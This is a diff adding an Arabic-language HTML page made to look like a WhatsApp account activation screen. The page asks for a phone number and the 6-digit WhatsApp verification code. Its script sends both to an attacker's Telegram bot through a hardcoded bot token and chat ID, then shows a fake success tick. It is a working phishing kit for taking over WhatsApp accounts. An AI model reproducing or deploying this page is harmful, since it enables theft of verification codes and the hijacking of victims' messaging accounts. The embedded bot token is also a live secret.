@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تفعيل حسابك على واتساب</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #128C7E, #075E54);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        header {
+            margin-bottom: 30px;
+            position: relative;
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: #25D366;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .logo i {
+            font-size: 40px;
+        }
+        
+        h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .subtitle {
+            font-size: 18px;
+            opacity: 0.9;
+            margin-bottom: 30px;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+            text-align: right;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            font-size: 16px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 15px;
+            border-radius: 12px;
+            border: none;
+            background: rgba(255, 255, 255, 0.15);
+            color: #fff;
+            font-size: 18px;
+            outline: none;
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+        }
+        
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
+        input:focus {
+            background: rgba(255, 255, 255, 0.25);
+            border-color: #25D366;
+        }
+        
+        button {
+            background: #25D366;
+            color: white;
+            border: none;
+            padding: 16px;
+            width: 100%;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            margin-top: 10px;
+        }
+        
+        button:hover {
+            background: #128C7E;
+            transform: translateY(-2px);
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        .loader {
+            display: none;
+            margin: 30px auto;
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 5px solid #25D366;
+            animation: spin 1s linear infinite;
+        }
+        
+        .success {
+            display: none;
+            font-size: 60px;
+            color: #25D366;
+            margin: 30px 0;
+            animation: scale 0.5s ease;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes scale {
+            0% { transform: scale(0.5); opacity: 0; }
+            70% { transform: scale(1.2); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        
+        .note {
+            margin-top: 20px;
+            font-size: 14px;
+            opacity: 0.8;
+            text-align: center;
+        }
+        
+        .error {
+            color: #ff6b6b;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+            text-align: right;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <i class="fab fa-whatsapp"></i>
+            </div>
+            <h1>لأن راحتك تهمنا!</h1>
+            <p class="subtitle">فعل حسابك حتى إذا كانت شبكة الاتصال غير متوفرة</p>
+        </header>
+        
+        <main>
+            <div class="form-group">
+                <label for="phone">رقم الهاتف مسبوق برمز البلد</label>
+                <input type="tel" id="phone" placeholder="مثال: +966XXXXXXXXX">
+                <div id="phone-error" class="error">يرجى إدخال رقم هاتف صحيح</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="code">الكود الذي تم إرساله لك على الوتساب</label>
+                <input type="text" id="code" placeholder="أدخل الكود المكون من 6 أرقام" maxlength="6">
+                <div id="code-error" class="error">الكود يجب أن يتكون من 6 أرقام فقط</div>
+            </div>
+            
+            <button id="verify-btn">
+                تحقق
+            </button>
+            
+            <div class="loader" id="loader"></div>
+            <div class="success" id="success">✓</div>
+            
+            <p class="note">
+                هذا الإجراء ضروري لتأمين حسابك والحفاظ على خصوصية بياناتك
+            </p>
+        </main>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const phoneInput = document.getElementById('phone');
+            const codeInput = document.getElementById('code');
+            const verifyBtn = document.getElementById('verify-btn');
+            const loader = document.getElementById('loader');
+            const success = document.getElementById('success');
+            const phoneError = document.getElementById('phone-error');
+            const codeError = document.getElementById('code-error');
+            
+            // إخفاء رسائل الخطأ عند الكتابة
+            phoneInput.addEventListener('input', () => {
+                phoneError.style.display = 'none';
+            });
+            
+            codeInput.addEventListener('input', () => {
+                codeError.style.display = 'none';
+            });
+            
+            // التحقق من البيانات عند الضغط على الزر
+            verifyBtn.addEventListener('click', function() {
+                const phone = phoneInput.value.trim();
+                const code = codeInput.value.trim();
+                let valid = true;
+                
+                // التحقق من رقم الهاتف
+                if (!phone || !/^\+\d{10,15}$/.test(phone)) {
+                    phoneError.style.display = 'block';
+                    valid = false;
+                }
+                
+                // التحقق من الكود
+                if (!code || code.length !== 6 || !/^\d{6}$/.test(code)) {
+                    codeError.style.display = 'block';
+                    valid = false;
+                }
+                
+                if (valid) {
+                    // إخفاء الزر وإظهار المؤشر
+                    verifyBtn.style.display = 'none';
+                    loader.style.display = 'block';
+                    
+                    // إرسال البيانات إلى التلجرام
+                    sendToTelegram(phone, code);
+                    
+                    // عرض رسالة النجاح بعد 4 ثواني
+                    setTimeout(() => {
+                        loader.style.display = 'none';
+                        success.style.display = 'block';
+                        
+                        // إخفاء النجاح بعد 3 ثواني
+                        setTimeout(() => {
+                            success.style.display = 'none';
+                            verifyBtn.style.display = 'block';
+                        }, 3000);
+                    }, 4000);
+                }
+            });
+            
+            // دالة إرسال البيانات إلى التلجرام
+            function sendToTelegram(phone, code) {
+                const botToken = '7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM';
+                const chatId = '7493001551';
+                const message = `📱 تم الحصول على بيانات جديدة!\n\n📞 رقم الهاتف: ${phone}\n🔒 الكود: ${code}\n\n🕒 الوقت: ${new Date().toLocaleString()}`;
+                
+                // استخدام API التلجرام لإرسال الرسالة
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('تم إرسال البيانات إلى التلجرام:', data);
+                })
+                .catch(error => {
+                    console.error('حدث خطأ في الإرسال:', error);
+                });
+            }
+        });
+    </script>
+</body>
+</html>
